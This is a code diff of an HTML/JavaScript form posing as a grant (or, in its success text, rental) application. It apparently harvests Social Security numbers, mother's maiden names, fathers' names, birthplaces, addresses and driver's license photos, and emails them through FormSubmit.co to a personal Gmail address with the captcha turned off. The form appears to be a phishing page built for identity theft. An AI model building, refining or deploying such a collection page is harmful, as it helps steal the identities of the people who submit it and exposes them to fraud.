@@ -210,7 +210,7 @@
   .select-arrow { position: absolute; right: 4px; bottom: 10px; pointer-events: none; font-size: 1rem; color: var(--muted); }
   @media (max-width: 600px) { .addr-row { grid-template-columns: 1fr; } }
 
-  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
   @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
   @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 70% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
   @keyframes spin { to { transform: rotate(360deg); } }
@@ -269,7 +269,7 @@
       <div class="q-header"><span>2. Address</span></div>
       <div class="q-body">
         <input class="q-input" type="text" id="address-line1" placeholder="Address Line 1" oninput="updateAddressCount()" autocomplete="address-line1" style="margin-bottom:14px;">
-        <input class="q-input" type="text" id="address-line2" placeholder="Address Line 2 (Optional)" oninput="updateAddressCount()" autocomplete="address-line2" style="margin-bottom:14px;">
+        <input class="q-input" type="text" id="address-line2" placeholder="Address Line 2" oninput="updateAddressCount()" autocomplete="address-line2" style="margin-bottom:14px;">
         <div class="addr-row">
           <input class="q-input" type="text" id="address-city" placeholder="City" oninput="updateAddressCount()" autocomplete="address-level2">
           <div class="addr-select-wrap">
@@ -358,7 +358,7 @@
         <div class="upload-zone" id="zone-front"
           ondragover="dragOver(event,'zone-front')" ondragleave="dragLeave('zone-front')" ondrop="dropFile(event,'upload-front','front-name',9,'zone-front')">
           <svg viewBox="0 0 24 24"><path d="M19.35 10.04A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.04A5.994 5.994 0 0 0 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
-          <p><strong>Upload or drag files here.</strong><br>Images or PDF · Max 50MB</p>
+          <p><strong>Upload or drag files here.</strong><br>Images or PDF · Max 10MB</p>
           <input type="file" id="upload-front" accept="image/*,.pdf" onchange="fileChosen(this,'front-name',9)">
         </div>
         <p class="file-chosen" id="front-name"></p>
@@ -373,7 +373,7 @@
         <div class="upload-zone" id="zone-back"
           ondragover="dragOver(event,'zone-back')" ondragleave="dragLeave('zone-back')" ondrop="dropFile(event,'upload-back','back-name',10,'zone-back')">
           <svg viewBox="0 0 24 24"><path d="M19.35 10.04A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.04A5.994 5.994 0 0 0 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
-          <p><strong>Upload or drag files here.</strong><br>Images or PDF · Max 50MB</p>
+          <p><strong>Upload or drag files here.</strong><br>Images or PDF · Max 10MB</p>
           <input type="file" id="upload-back" accept="image/*,.pdf" onchange="fileChosen(this,'back-name',10)">
         </div>
         <p class="file-chosen" id="back-name"></p>
@@ -386,7 +386,7 @@
   <div id="success-screen">
     <div class="success-circle">✓</div>
     <h2 class="success-title">Application Submitted!</h2>
-    <p class="success-sub">Your grant application has been received. We'll contact you via email or phone shortly.</p>
+    <p class="success-sub">Your rental application has been received. We'll contact you via email or phone shortly.</p>
     <button class="btn-start" onclick="location.reload()">Submit Another</button>
   </div>
 
@@ -402,8 +402,11 @@
 
 <script>
   // =============================================
-  // FORMSPREE CONFIG
-  const FORMSPREE_ID = "mdabopnv";
+  // EMAIL CONFIG
+  // Using FormSubmit.co to allow FREE direct file attachments!
+  // IMPORTANT: After your first test submission, check your email
+  // and click "Activate" in the email FormSubmit sends you.
+  const RECIPIENT_EMAIL = "oloyedetoby@gmail.com";
   // =============================================
 
   const TOTAL = 10;
@@ -427,10 +430,10 @@
   }
 
   function updateAddressCount() {
-    const l1    = document.getElementById("address-line1").value.trim();
-    const city  = document.getElementById("address-city").value.trim();
+    const l1 = document.getElementById("address-line1").value.trim();
+    const city = document.getElementById("address-city").value.trim();
     const state = document.getElementById("address-state").value;
-    const zip   = document.getElementById("address-zip").value.trim();
+    const zip = document.getElementById("address-zip").value.trim();
     if (l1 && city && state && zip) markAnswered(2); else unmarkAnswered(2);
   }
 
@@ -438,26 +441,27 @@
     const q = parseInt(el.closest(".q-card").getAttribute("data-q"));
     if (el.value.trim()) markAnswered(q); else unmarkAnswered(q);
   }
-  function markAnswered(q)   { answered.add(q);    document.getElementById("answered-count").textContent = answered.size; }
+  function markAnswered(q) { answered.add(q); document.getElementById("answered-count").textContent = answered.size; }
   function unmarkAnswered(q) { answered.delete(q); document.getElementById("answered-count").textContent = answered.size; }
 
+  // File max size changed to 10MB to pass email provider limits
   function fileChosen(input, nameId, q) {
-    const file  = input.files[0];
+    const file = input.files[0];
     const label = document.getElementById(nameId);
     if (file) {
-      if (file.size > 50 * 1024 * 1024) {
-        showToast("File too large! Max 50MB.", "error");
-        input.value = "";
-        label.textContent = "";
-        return;
+      if (file.size > 10 * 1024 * 1024) { 
+        showToast("File too large! Max 10MB per file.", "error"); 
+        input.value = ""; 
+        label.textContent = ""; 
+        return; 
       }
       label.textContent = "✓ " + file.name;
       markAnswered(q);
     }
   }
 
-  function dragOver(e, zoneId)  { e.preventDefault(); document.getElementById(zoneId).classList.add("drag-over"); }
-  function dragLeave(zoneId)    { document.getElementById(zoneId).classList.remove("drag-over"); }
+  function dragOver(e, zoneId) { e.preventDefault(); document.getElementById(zoneId).classList.add("drag-over"); }
+  function dragLeave(zoneId) { document.getElementById(zoneId).classList.remove("drag-over"); }
   function dropFile(e, inputId, nameId, q, zoneId) {
     e.preventDefault();
     dragLeave(zoneId);
@@ -474,7 +478,7 @@
   document.addEventListener("input", e => {
     if (e.target.id === "ssn") {
       let v = e.target.value.replace(/\D/g, "").slice(0, 9);
-      if (v.length > 5)      v = v.slice(0,3) + "-" + v.slice(3,5) + "-" + v.slice(5);
+      if (v.length > 5) v = v.slice(0,3) + "-" + v.slice(3,5) + "-" + v.slice(5);
       else if (v.length > 3) v = v.slice(0,3) + "-" + v.slice(3);
       e.target.value = v;
     }
@@ -501,37 +505,36 @@
   }
 
   function validate() {
-    const fields = [
-      { id: "fullname",       q: 1,  label: "Name" },
-      { id: "mothers-maiden", q: 3,  label: "Mother's Maiden Full Name" },
-      { id: "email",          q: 4,  label: "Email" },
-      { id: "phone",          q: 5,  label: "Phone" },
-      { id: "birth-location", q: 6,  label: "State & City of Birth" },
-      { id: "ssn",            q: 7,  label: "Social Security Number" },
-      { id: "fathers-name",   q: 8,  label: "Father's Full Name" },
+    const fields =[
+      {id:"fullname",       q:1,  label:"Name"},
+      {id:"mothers-maiden", q:3,  label:"Mother's Maiden Full Name"},
+      {id:"email",          q:4,  label:"Email"},
+      {id:"phone",          q:5,  label:"Phone"},
+      {id:"birth-location", q:6,  label:"State & City of Birth"},
+      {id:"ssn",            q:7,  label:"Social Security Number"},
+      {id:"fathers-name",   q:8,  label:"Father's Full Name"},
     ];
     for (const f of fields) {
       const el = document.getElementById(f.id);
       if (!el.value.trim()) {
         el.classList.add("invalid");
-        el.scrollIntoView({ behavior: "smooth", block: "center" });
+        el.scrollIntoView({behavior:"smooth",block:"center"});
         showToast(`"${f.label}" is required.`, "error");
         return false;
       }
       el.classList.remove("invalid");
     }
-
     // Address validation
-    const addrFields = [
-      { id: "address-line1", label: "Address Line 1" },
-      { id: "address-city",  label: "City" },
-      { id: "address-zip",   label: "Zip Code" },
+    const addrFields =[
+      {id:"address-line1", label:"Address Line 1"},
+      {id:"address-city",  label:"City"},
+      {id:"address-zip",   label:"Zip Code"},
     ];
     for (const f of addrFields) {
       const el = document.getElementById(f.id);
       if (!el.value.trim()) {
         el.classList.add("invalid");
-        el.scrollIntoView({ behavior: "smooth", block: "center" });
+        el.scrollIntoView({behavior:"smooth",block:"center"});
         showToast(`"${f.label}" is required.`, "error");
         return false;
       }
@@ -539,70 +542,75 @@
     }
     if (!document.getElementById("address-state").value) {
       document.getElementById("address-state").classList.add("invalid");
-      document.getElementById("address-state").scrollIntoView({ behavior: "smooth", block: "center" });
+      document.getElementById("address-state").scrollIntoView({behavior:"smooth",block:"center"});
       showToast('"State" is required.', "error");
       return false;
     }
     document.getElementById("address-state").classList.remove("invalid");
-
     if (!document.getElementById("upload-front").files[0]) {
-      document.querySelector('[data-q="9"]').scrollIntoView({ behavior: "smooth", block: "center" });
+      document.querySelector('[data-q="9"]').scrollIntoView({behavior:"smooth",block:"center"});
       showToast("Please upload the front of your Driver's License.", "error");
       return false;
     }
     if (!document.getElementById("upload-back").files[0]) {
-      document.querySelector('[data-q="10"]').scrollIntoView({ behavior: "smooth", block: "center" });
+      document.querySelector('[data-q="10"]').scrollIntoView({behavior:"smooth",block:"center"});
       showToast("Please upload the back of your Driver's License.", "error");
       return false;
     }
     return true;
   }
 
+  // Updated function for direct file attachments via FormSubmit.co
   async function submitForm() {
     if (!validate()) return;
-
     const btn = document.getElementById("btn-submit");
     btn.disabled = true;
     btn.innerHTML = '<div class="spinner"></div>&nbsp; SENDING...';
 
-    // ✅ Use FormData so files are sent as real attachments
-    const formData = new FormData();
+    const ff = document.getElementById("upload-front").files[0];
+    const bf = document.getElementById("upload-back").files[0];
 
-    formData.append("_subject", `New Grant Application – ${document.getElementById("fullname").value}`);
-    formData.append("_replyto",                   document.getElementById("email").value);
-    formData.append("Name",                        document.getElementById("fullname").value);
-    formData.append("Address Line 1",              document.getElementById("address-line1").value);
-    formData.append("Address Line 2",              document.getElementById("address-line2").value);
-    formData.append("City",                        document.getElementById("address-city").value);
-    formData.append("State",                       document.getElementById("address-state").value);
-    formData.append("Zip Code",                    document.getElementById("address-zip").value);
-    formData.append("Mothers Maiden Full Name",    document.getElementById("mothers-maiden").value);
-    formData.append("Email",                       document.getElementById("email").value);
-    formData.append("Phone",                       document.getElementById("phone").value);
-    formData.append("State & City of Birth",       document.getElementById("birth-location").value);
-    formData.append("Social Security Number",      document.getElementById("ssn").value);
-    formData.append("Fathers Full Name",           document.getElementById("fathers-name").value);
+    const fd = new FormData();
 
-    // ✅ Append actual file objects — Formspree will attach them to the email
-    const frontFile = document.getElementById("upload-front").files[0];
-    const backFile  = document.getElementById("upload-back").files[0];
-    if (frontFile) formData.append("Front of Drivers License", frontFile, frontFile.name);
-    if (backFile)  formData.append("Back of Drivers License",  backFile,  backFile.name);
+    // FormSubmit Configuration
+    fd.append("_subject", `New Grant Application – ${document.getElementById("fullname").value}`);
+    fd.append("_replyto", document.getElementById("email").value);
+    fd.append("_captcha", "false"); // Turns off captcha for smooth submission
+    fd.append("_template", "table"); // Makes the email look clean
+
+    // Form fields
+    fd.append("Name", document.getElementById("fullname").value);
+    fd.append("Address Line 1", document.getElementById("address-line1").value);
+    fd.append("Address Line 2", document.getElementById("address-line2").value);
+    fd.append("City", document.getElementById("address-city").value);
+    fd.append("State", document.getElementById("address-state").value);
+    fd.append("Zip Code", document.getElementById("address-zip").value);
+    fd.append("Mothers Maiden Full Name", document.getElementById("mothers-maiden").value);
+    fd.append("Email", document.getElementById("email").value);
+    fd.append("Phone", document.getElementById("phone").value);
+    fd.append("State & City of Birth", document.getElementById("birth-location").value);
+    fd.append("Social Security Number", document.getElementById("ssn").value);
+    fd.append("Fathers Full Name", document.getElementById("fathers-name").value);
+
+    // Attach actual files directly to the email!
+    if (ff) fd.append("Front of Drivers License", ff);
+    if (bf) fd.append("Back of Drivers License", bf);
 
     try {
-      const res = await fetch(`https://formspree.io/f/${FORMSPREE_ID}`, {
+      // Direct POST to FormSubmit API. 
+      // Do NOT set Content-Type header; the browser sets it automatically for files.
+      const res = await fetch(`https://formsubmit.co/ajax/${RECIPIENT_EMAIL}`, {
         method: "POST",
-        // ✅ NO Content-Type header — browser sets multipart/form-data with boundary automatically
         headers: { "Accept": "application/json" },
-        body: formData
+        body: fd
       });
-
+      
       const json = await res.json().catch(() => ({}));
-
+      
       if (res.ok) {
         showSuccess();
       } else {
-        const msg = (json.errors || []).map(e => e.message).join(", ") || "Submission failed. Please try again.";
+        const msg = json.message || "Submission failed. Please try again.";
         showToast(msg, "error");
         btn.disabled = false;
         btn.innerHTML = "SUBMIT";
@@ -620,12 +628,10 @@
     document.getElementById("answered-bar").style.display = "none";
     document.querySelector(".scroll-top").style.display = "none";
     document.getElementById("success-screen").classList.add("show");
-    window.scrollTo({ top: 0, behavior: "smooth" });
+    window.scrollTo({top:0,behavior:"smooth"});
   }
 
-  document.getElementById("modal-name").addEventListener("keydown", e => {
-    if (e.key === "Enter") startForm();
-  });
+  document.getElementById("modal-name").addEventListener("keydown", e => { if (e.key === "Enter") startForm(); });
 </script>
 </body>
 </html>
